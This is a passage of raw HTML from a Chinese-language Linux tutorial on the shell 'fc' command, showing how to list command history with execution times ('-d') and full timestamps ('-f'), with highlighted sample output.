crayon-striped-num\" data-line=\"crayon-5b4aa931c7fb9645498242-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fb9645498242-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fb9645498242-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fb9645498242-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fb9645498242-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fb9645498242-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fb9645498242-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Welcome to OSTechNix\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fb9645498242-2\"><span class=\"crayon-e\">Welcome </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">OSTechNix</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fb9645498242-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fb9645498242-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fb9645498242-5\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Welcome to OSTechNix\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fb9645498242-6\"><span class=\"crayon-e\">Welcome </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">OSTechNix</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fb9645498242-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>如你所见，<code>fc</code> 带了 <code>-e</code> 选项，但并没有编辑上一个命令（例中的 <code>echo \" Welcome to OSTechNix\"</code>）。</p>\n<p>需要注意的是，有些选项仅对指定 shell 有效。比如下面这些选项可以用在 zsh 中，但在 Bash 或 Ksh 中则不能用。</p>\n<h4 id=\"toc_6\">显示命令的执行时间</h4>\n<p>想要知道命令是在什么时候执行的，可以用 <code>-d</code> 选项：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7fbc961438647\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfc -ld\r\n1 18:41 exit\r\n2 18:41 clear\r\n3 18:42 fc -l\r\n4 18:42 sudo netctl restart wlp9s0sktab\r\n5 18:42 ls -l\r\n6 18:42 pwd\r\n7 18:42 uname -r\r\n8 18:43 uname -a\r\n9 18:43 cat ostechnix.txt\r\n10 18:43 echo \"Welcome to OSTechNix\"\r\n11 18:43 more ostechnix.txt\r\n12 18:43 wc -l ostechnix.txt\r\n13 18:43 cat ostechnix.txt\r\n14 18:43 clear\r\n15 18:43 fc -l\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbc961438647-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbc961438647-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbc961438647-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbc961438647-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbc961438647-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbc961438647-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbc961438647-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbc961438647-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbc961438647-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbc961438647-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbc961438647-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbc961438647-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbc961438647-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbc961438647-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbc961438647-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbc961438647-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbc961438647-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbc961438647-1\"><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">ld</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbc961438647-2\"><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">41</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">exit</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbc961438647-3\"><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">41</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">clear</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbc961438647-4\"><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbc961438647-5\"><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">netctl </span><span class=\"crayon-e\">restart </span><span class=\"crayon-i\">wlp9s0sktab</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbc961438647-6\"><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbc961438647-7\"><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbc961438647-8\"><span class=\"crayon-cn\">7</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbc961438647-9\"><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbc961438647-10\"><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbc961438647-11\"><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Welcome to OSTechNix\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbc961438647-12\"><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbc961438647-13\"><span class=\"crayon-cn\">12</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbc961438647-14\"><span class=\"crayon-cn\">13</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbc961438647-15\"><span class=\"crayon-cn\">14</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">clear</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbc961438647-16\"><span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbc961438647-17\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0035 seconds] -->\r\n<p>这样你就可以查看最近命令的具体执行时间了。</p>\n<p>使用选项 <code>-f</code> ，可以为每个命令显示完整的时间戳。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7fbf792483372\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n fc -lf\r\n 1 4/5/2018 18:41 exit\r\n 2 4/5/2018 18:41 clear\r\n 3 4/5/2018 18:42 fc -l\r\n 4 4/5/2018 18:42 sudo netctl restart wlp9s0sktab\r\n 5 4/5/2018 18:42 ls -l\r\n 6 4/5/2018 18:42 pwd\r\n 7 4/5/2018 18:42 uname -r\r\n 8 4/5/2018 18:43 uname -a\r\n 9 4/5/2018 18:43 cat ostechnix.txt\r\n 10 4/5/2018 18:43 echo \"Welcome to OSTechNix\"\r\n 11 4/5/2018 18:43 more ostechnix.txt\r\n 12 4/5/2018 18:43 wc -l ostechnix.txt\r\n 13 4/5/2018 18:43 cat ostechnix.txt\r\n 14 4/5/2018 18:43 clear\r\n 15 4/5/2018 18:43 fc -l\r\n 16 4/5/2018 18:43 fc -ld\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbf792483372-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbf792483372-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbf792483372-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbf792483372-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbf792483372-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbf792483372-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbf792483372-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbf792483372-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbf792483372-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbf792483372-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbf792483372-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbf792483372-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbf792483372-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbf792483372-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbf792483372-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbf792483372-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fbf792483372-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fbf792483372-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbf792483372-1\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">lf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbf792483372-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">41</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">exit</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbf792483372-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">41</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">clear</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbf792483372-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbf792483372-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">netctl </span><span class=\"crayon-e\">restart </span><span class=\"crayon-i\">wlp9s0sktab</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbf792483372-6\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbf792483372-7\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbf792483372-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbf792483372-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbf792483372-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbf792483372-11\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Welcome to OSTechNix\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbf792483372-12\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbf792483372-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbf792483372-14\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbf792483372-15\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">clear</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbf792483372-16\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fbf792483372-17\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">ld</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fbf792483372-18\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0056 seconds] -->\r\n<p>当然，欧洲的老乡们还可以使用 <code>-E</code> 选项来显示欧洲时间格式。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7fc3108526714\" class=\"crayon-syntax crayon-theme-github 